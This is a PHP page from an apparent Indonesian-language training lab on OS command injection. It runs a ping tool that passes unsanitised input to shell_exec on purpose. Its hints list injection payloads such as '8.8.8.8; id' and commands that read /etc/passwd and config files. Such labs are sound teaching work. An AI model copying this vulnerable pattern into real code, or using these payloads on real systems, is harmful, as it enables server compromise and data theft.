<?php
$active = 'basic-1';
$host   = $_POST['host'] ?? '';
$output = '';
$error  = '';
$executed = false;

// Safe output helper
function safe($s){ return htmlspecialchars($s, ENT_QUOTES, 'UTF-8'); }

if ($_SERVER['REQUEST_METHOD'] === 'POST' && $host !== '') {
    $executed = true;
    // VULNERABLE: input langsung digunakan tanpa sanitasi
    $cmd    = "ping -c 3 " . $host . " 2>&1";
    $output = shell_exec($cmd);
    if ($output === null || $output === '') {
        $error = "Tidak ada output dari command.";
    }
}
?>
<!DOCTYPE html>
<html lang="id">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Basic 1: Command Injection — IDN Lab</title>
<?php include '../includes/shared_css.php'; ?>
</head>
<body>
<?php include '../includes/nav.php'; ?>

<div class="phdr">
  <div class="phdr-in">
    <div class="bc"><a href="/">Dashboard</a><span class="bc-sep">/</span><span>Basic 1: Basic CMDi</span></div>
    <h1>Basic Command Injection <span class="tag g">BASIC 1</span></h1>
    <p class="phdr-desc">Network diagnostic tool yang menggunakan input host langsung dalam pemanggilan <code class="ic">shell_exec()</code>. Input tidak disanitasi, sehingga command separator dapat menyisipkan perintah arbitrer.</p>
  </div>
</div>

<div class="wrap">

  <div class="box">
    <div class="box-t">Objectives</div>
    <ul class="obj-list">
      <li><div class="obj-n">1</div><span>Konfirmasi kerentanan dengan menginjeksi command <code class="ic">id</code> menggunakan separator <code class="ic">;</code></span></li>
      <li><div class="obj-n">2</div><span>Eksekusi <code class="ic">whoami</code>, <code class="ic">hostname</code>, dan <code class="ic">uname -a</code> untuk enumerasi sistem</span></li>
      <li><div class="obj-n">3</div><span>Baca isi file <code class="ic">/var/private/flag.txt</code> menggunakan <code class="ic">cat</code></span></li>
      <li><div class="obj-n">4</div><span>Coba semua jenis separator: <code class="ic">;</code> <code class="ic">&&</code> <code class="ic">||</code> <code class="ic">|</code> dan amati perbedaan perilakunya</span></li>
    </ul>
  </div>

  <div class="box">
    <div class="box-t">Vulnerability Context</div>
    <p class="prose" style="margin-bottom:12px">Kode PHP yang rentan pada aplikasi ini:</p>
    <div class="qbox"><div class="ql">Vulnerable PHP Code</div><span class="val">$host</span>   = <span class="val">$_POST</span>[<span class="str">'host'</span>];              <span class="cm">// tidak ada validasi</span>
<span class="val">$cmd</span>    = <span class="str">"ping -c 3 "</span> . <span class="val">$host</span> . <span class="str">" 2>&1"</span>;
<span class="val">$output</span> = <span class="at">shell_exec</span>(<span class="val">$cmd</span>);       <span class="cm">// command dijalankan di OS shell</span>
<span class="kw">echo</span> <span class="val">$output</span>;</div>
    <p class="prose">Input <code class="ic">8.8.8.8; id</code> akan menghasilkan command: <code class="ic">ping -c 3 8.8.8.8; id 2>&1</code> — dua command berjalan berurutan, output keduanya ditampilkan.</p>
  </div>

  <div class="box">
    <div class="box-t">Network Diagnostic Tool</div>
    <form method="POST" action="/basic-1/">
      <div class="fg">
        <label class="fl">Target Host / IP <span style="color:var(--red);font-size:.65rem">(VULNERABLE — tidak ada sanitasi)</span></label>
        <input class="fi" type="text" name="host"
          value="<?= safe($host) ?>"
          placeholder="Contoh: 8.8.8.8 atau 8.8.8.8; id">
      </div>
      <div style="display:flex;gap:10px;flex-wrap:wrap">
        <button type="submit" class="btn btn-r">
          <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><polyline points="4 17 10 11 4 5"/><line x1="12" y1="19" x2="20" y2="19"/></svg>
          Jalankan Ping
        </button>
        <?php if($executed): ?>
        <a href="/basic-1/" class="btn btn-g">Reset</a>
        <?php endif; ?>
      </div>
    </form>
  </div>

  <?php if ($executed): ?>

  <div class="box">
    <div class="box-t">Command Executed</div>
    <div class="qbox" style="margin-bottom:0;color:var(--orange)"><div class="ql">Shell Command</div>ping -c 3 <?= safe($host) ?> 2&gt;&amp;1</div>
  </div>

  <?php if ($error): ?>
    <div class="alert a-err"><?= safe($error) ?></div>
  <?php else: ?>
    <div class="term-hdr">
      <span class="term-dot" style="background:#e63946"></span>
      <span class="term-dot" style="background:#f59e0b"></span>
      <span class="term-dot" style="background:#22c55e"></span>
      <span class="term-title">Terminal Output</span>
    </div>
    <div class="terminal"><?= safe($output) ?></div>
    <?php if (str_contains($output, 'FLAG{')): ?>
    <div class="alert a-ok"><strong>FLAG ditemukan dalam output.</strong></div>
    <?php endif; ?>
  <?php endif; ?>

  <?php endif; ?>

  <div class="box">
    <div class="box-t">Separator Reference</div>
    <div class="sep-grid">
      <div class="sep-card"><div class="sep-sym">;</div><div class="sep-name">Semicolon</div><div class="sep-desc">Jalankan command berikutnya apapun hasilnya. Contoh: <code class="ic">8.8.8.8; id</code></div></div>
      <div class="sep-card"><div class="sep-sym">&&</div><div class="sep-name">AND</div><div class="sep-desc">Jalankan jika ping berhasil. Contoh: <code class="ic">8.8.8.8 && id</code></div></div>
      <div class="sep-card"><div class="sep-sym">||</div><div class="sep-name">OR</div><div class="sep-desc">Jalankan jika ping gagal. Contoh: <code class="ic">invalid_host || id</code></div></div>
      <div class="sep-card"><div class="sep-sym">|</div><div class="sep-name">Pipe</div><div class="sep-desc">Pipe output ke command lain. Contoh: <code class="ic">8.8.8.8 | id</code></div></div>
      <div class="sep-card"><div class="sep-sym">`cmd`</div><div class="sep-name">Backtick</div><div class="sep-desc">Substitusi dalam argumen. Contoh: <code class="ic">`id`</code></div></div>
      <div class="sep-card"><div class="sep-sym">$()</div><div class="sep-name">Subshell</div><div class="sep-desc">Substitusi modern. Contoh: <code class="ic">$(id)</code></div></div>
    </div>
  </div>

  <div class="box">
    <div class="box-t">Hints</div>
    <details class="hint">
      <summary>Hint 1 &mdash; Konfirmasi injection</summary>
      <div class="hint-body">Masukkan: <code class="ic">8.8.8.8; id</code><br>Jika output berisi hasil ping diikuti output dari <code class="ic">id</code> seperti <code class="ic">uid=33(www-data)...</code>, injection berhasil.</div>
    </details>
    <details class="hint">
      <summary>Hint 2 &mdash; Enumerasi sistem</summary>
      <div class="hint-body">
        <code class="ic">8.8.8.8; whoami</code> — user yang menjalankan web server<br>
        <code class="ic">8.8.8.8; uname -a</code> — informasi kernel dan OS<br>
        <code class="ic">8.8.8.8; ls /var/private</code> — list file di direktori target
      </div>
    </details>
    <details class="hint">
      <summary>Hint 3 &mdash; Baca file sensitif</summary>
      <div class="hint-body"><code class="ic">8.8.8.8; cat /var/private/flag.txt</code><br><code class="ic">8.8.8.8; cat /var/private/config.txt</code><br><code class="ic">8.8.8.8; cat /etc/passwd</code></div>
    </details>
    <details class="hint">
      <summary>Hint 4 &mdash; Perbedaan separator</summary>
      <div class="hint-body">Coba <code class="ic">invalid_host; id</code> vs <code class="ic">invalid_host && id</code>.<br>Dengan <code class="ic">&&</code>, command kedua tidak berjalan karena ping ke host invalid gagal. Dengan <code class="ic">;</code>, command kedua tetap berjalan meski ping gagal.</div>
    </details>
  </div>

</div>
<?php include '../includes/footer.php'; ?>
</body>
</html>
